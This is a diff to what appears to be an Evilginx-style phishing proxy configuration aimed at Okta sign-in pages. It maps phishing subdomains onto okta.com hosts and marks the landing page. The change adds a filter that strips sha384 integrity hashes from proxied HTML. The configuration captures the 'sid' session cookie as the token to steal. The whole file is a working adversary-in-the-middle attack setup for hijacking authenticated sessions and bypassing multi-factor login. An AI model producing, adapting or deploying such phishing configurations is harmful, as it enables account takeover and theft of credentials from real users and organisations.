@@ -4,7 +4,8 @@ proxy_hosts:
   - {phish_sub: 'login', orig_sub: 'login', domain: 'okta.com', session: false, is_landing: false}
   - {phish_sub: '', orig_sub: '', domain: 'okta.com', session: false, is_landing: false }
   - {phish_sub: 'EXAMPLE', orig_sub: 'EXAMPLE', domain: 'okta.com', session: true, is_landing: true}
-sub_filters: []
+sub_filters:
+  - {triggers_on: 'EXAMPLE.okta.com', orig_sub: '', domain: 'EXAMPLE.okta.com', search: 'sha384-.{64}', replace: '', mimes: ['text/html']}
 auth_tokens:
   - domain: 'EXAMPLE.okta.com'
     keys: ['sid']
